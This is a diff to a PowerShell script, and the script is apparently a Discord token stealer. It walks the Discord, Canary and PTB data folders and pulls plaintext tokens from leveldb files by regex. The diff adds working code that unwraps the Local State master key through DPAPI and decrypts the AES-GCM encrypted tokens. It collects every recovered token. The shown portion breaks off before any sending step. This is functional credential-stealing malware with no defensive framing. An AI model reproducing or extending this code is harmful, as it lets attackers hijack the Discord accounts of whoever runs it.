@@ -1,29 +1,77 @@
-$localAppData = $env:LOCALAPPDATA
 $appData = $env:APPDATA
+$localAppData = $env:LOCALAPPDATA
 
-$paths = @(
-    "$appData\Discord\Local Storage\leveldb",
-    "$appData\discordcanary\Local Storage\leveldb",
-    "$appData\discordptb\Local Storage\leveldb",
-    "$localAppData\Discord\Local Storage\leveldb",
-    "$localAppData\discordcanary\Local Storage\leveldb",
-    "$localAppData\discordptb\Local Storage\leveldb"
+Add-Type -AssemblyName System.Security
+
+$discordPaths = @(
+    "$appData\discord",
+    "$appData\discordcanary",
+    "$appData\discordptb",
+    "$localAppData\discord",
+    "$localAppData\discordcanary",
+    "$localAppData\discordptb"
 )
 
-$tokenRegex = [regex]'(mfa\.[a-zA-Z0-9_-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{38,})'
+$tokenRegex = [regex]'dQw4w9WgXcQ:[^"]*'
+$plainRegex = [regex]'(mfa\.[a-zA-Z0-9_-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{38,})'
 
 $found = @{}
 
-foreach ($path in $paths) {
-    if (-not (Test-Path $path)) { continue }
-    Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+function Decrypt-Token($encrypted) {
+    try {
+        $encBytes = [Convert]::FromBase64String($encrypted)
+        # Strip "v10" or "v11" prefix (3 bytes)
+        $payload = $encBytes[3..($encBytes.Length - 1)]
+        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    } catch { return $null }
+}
+
+foreach ($base in $discordPaths) {
+    # Check leveldb for plain tokens
+    $ldb = "$base\Local Storage\leveldb"
+    if (Test-Path $ldb) {
+        Get-ChildItem -Path $ldb -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                $content = [System.IO.File]::ReadAllText($_.FullName)
+                $plainRegex.Matches($content) | ForEach-Object {
+                    $found[$_.Value] = $true
+                }
+            } catch {}
+        }
+    }
+
+    # Check Local State + leveldb for encrypted tokens
+    $localState = "$base\Local State"
+    if (Test-Path $localState) {
         try {
-            $content = [System.IO.File]::ReadAllText($_.FullName)
-            $matches = $tokenRegex.Matches($content)
-            foreach ($match in $matches) {
-                $token = $match.Value
-                if (-not $found.ContainsKey($token)) {
-                    $found[$token] = $_.FullName
+            $ls = Get-Content $localState -Raw | ConvertFrom-Json
+            $encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
+            $masterKey = $encKey[5..($encKey.Length - 1)]
+            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+            $ldb2 = "$base\Local Storage\leveldb"
+            if (Test-Path $ldb2) {
+                Get-ChildItem -Path $ldb2 -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                    try {
+                        $content = [System.IO.File]::ReadAllText($_.FullName)
+                        $tokenRegex.Matches($content) | ForEach-Object {
+                            $enc = $_.Value.Split(":")[1]
+                            $encBytes = [Convert]::FromBase64String($enc)
+                            # iv = bytes 3-15, data = bytes 15+
+                            $iv = $encBytes[3..14]
+                            $data = $encBytes[15..($encBytes.Length - 1)]
+                            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+                            $tag = $data[($data.Length - 16)..($data.Length - 1)]
+                            $cipher = $data[0..($data.Length - 17)]
+                            $plain = New-Object byte[] $cipher.Length
+                            $aes.Decrypt($iv, $cipher, $tag, $plain)
+                            $token = [System.Text.Encoding]::UTF8.GetString($plain)
+                            if ($token -match '^[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}$') {
+                                $found[$token] = $true
+                            }
+                        }
+                    } catch {}
                 }
             }
         } catch {}
